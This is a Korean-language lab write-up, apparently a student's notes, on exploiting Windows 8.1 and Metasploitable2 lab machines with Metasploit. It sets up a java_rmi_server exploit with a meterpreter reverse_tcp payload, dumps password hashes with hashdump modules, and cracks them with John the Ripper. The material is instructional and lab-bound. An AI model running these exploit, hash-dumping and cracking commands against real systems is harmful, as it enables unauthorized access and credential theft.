# John the Ripper 실습
이전에 window Xp에서 했던 것처럼 Window 8.1, metasploit의 Hash값을 얻고 이를 Cracking을 해볼 것이다.  
따라서 Window 8.1에 세션을 맺고 passwordHash를 얻어보자.
### 실습 준비
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/%EC%8B%A4%EC%8A%B5%20%EC%A4%80%EB%B9%841.png)
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/%EC%8B%A4%EC%8A%B5%20%EC%A4%80%EB%B9%842.png)
위의 사진과 같이 exploit을 하고 시스템 정보를 얻어보자.  
**sysinfo**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/%EC%8B%9C%EC%8A%A4%ED%85%9C%20%EC%A0%95%EB%B3%B4%20%EC%96%BB%EA%B8%B0.png)  

이후 hashdump를 얻어보자.  
**run post/windows/gather/hashdump**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/hash%20%EA%B0%92%20%ED%99%95%EC%9D%B8.png)  
이 Hash 값을 이전의 WindowXp의 Hash를 저장할 때처럼 nano 명령어를 통해 값을 저장할 하고 다음의 Metasexpolit에서도 동일하게 진행할 것이다.  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/Hash%20%EA%B0%92%20%EC%A0%80%EC%9E%A5.png)  

이제는 Metasploitable2에 대해 진행을 해볼 것이다.  
**exit**  
Window8.1 expolit 해제.  
**search java_rmi**  
**use exploit/multi/misc/java_rmi_server**
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/%EC%8B%A4%EC%8A%B52%20%EC%A4%80%EB%B9%841.png)  
**set payload java/meterpreter/reverse_tcp**  
**show options**  
**set RHOST (Meta IP)**  
**set LHOST (Kali IP)**  
**set httpdelay 60**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/%EC%8B%A4%EC%8A%B52%20%EC%A4%80%EB%B9%842.png)
**sysinfo**  
현재 Meta에 들어왔는지 확인  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/%EC%8B%A4%EC%8A%B52%20%EC%A4%80%EB%B9%84%EC%99%84%EB%A3%8C.png)  
 
이후 **run post/linux/gather/hashdump**를 통해 PasswordHash값을 얻는다.  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/%EC%8B%A4%EC%8A%B52%20hash%20%EC%96%BB%EA%B8%B0.png)  
이를 Window 8.1과 같은 방법으로 저장한다.  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/%EC%8B%A4%EC%8A%B52%20hash%20%EC%A0%80%EC%9E%A5.png)  
 
이후 새로운 터미널에서 john을 치면 John the Ripper에 대한 정보가 나온다.  
**find / -nmae password.lst**  
를 새로운 터미널에서 Metasploit 프레임에서 제공하는 passwordlist파일을 확인한다. 
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/%EC%8B%A4%EC%8A%B52%20%EC%82%AC%EC%9A%A9%ED%95%A0%20passwordlist%20%EC%B0%BE%EA%B8%B0.png)
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/%EC%8B%A4%EC%8A%B52%20%EC%82%AC%EC%9A%A9%ED%95%A0%20passwordlist.png)
**cat /usr/share/metasploit-framework/data/wordlists/passwordlist.lst |wc**  
를 통해 현재 password파일의 라인 수, 단어 수, 문자 수를 확인해본다.  
이후 password파일을 보며 자신이 추가하고 싶은 단어가 없을 경우 내부에 추가해도 괜찮다.  

**john --wordlist=/usr/share/metasploit-framework/data/wordlists/password.lst /home/kali/Desktop/WinXPHash.txt**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/Password%20Cracking%20%EC%8B%9C%EB%8F%84.png)
이는 정상적으로 동작하지 않게 된다 이유는 format이 다르기 때문이므로 아래의 명령어를 사용해서 시도해보면 된다.  
**john --wordlist=/usr/share/metasploit-framework/data/wordlists/password.lst /home/kali/Desktop/WinXPHash.txt --format=NT**  
**john --wordlist=/usr/share/metasploit-framework/data/wordlists/password.lst /home/kali/Desktop/MetaHash.txt**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Password%20Cracking/John%20The%20Ripper/Source/meta%20hash%20%ED%95%B4%EC%A0%9C.png)  
**john --wordlist=/usr/share/metasploit-framework/data/wordlists/password.lst /home/kali/Desktop/Win8Hash.txt --format=NT**  
도 동일하게 작업해서 시도하면 된다.
